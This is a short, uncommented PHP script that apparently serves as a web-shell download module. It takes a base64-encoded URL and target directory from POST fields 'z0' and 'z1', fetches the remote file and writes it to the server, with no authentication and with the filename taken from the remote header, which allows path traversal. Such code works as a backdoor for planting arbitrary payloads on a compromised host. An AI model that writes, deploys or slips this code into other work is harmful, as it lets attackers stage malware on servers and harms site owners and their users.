<?php

$url = base64_decode($_POST['z0']);
$save_dir = base64_decode($_POST['z1']);

$headers = get_headers($url, true);

$filename = null;

if (isset($headers['Content-Disposition'])) {
    if (preg_match('/filename="?([^"]+)"?/i', $headers['Content-Disposition'], $m)) {
        $filename = $m[1];
    }
}

if (!$filename) {
    $path = parse_url($url, PHP_URL_PATH);
    $filename = basename($path);
}

if (!$filename || $filename === '/') {
    $filename = 'download.bin';
}

$filePath = rtrim($save_dir, '/') . '/' . $filename;
$data = file_get_contents($url);

if ($data === false) {
    echo json_encode([
        'success' => false,
        'error' => 'Download failed'
    ]);

    exit;
}

file_put_contents($filePath, $data);
echo json_encode([
    'success' => true,
    'filename' => $filename,
    'path' => $filePath
]);

?>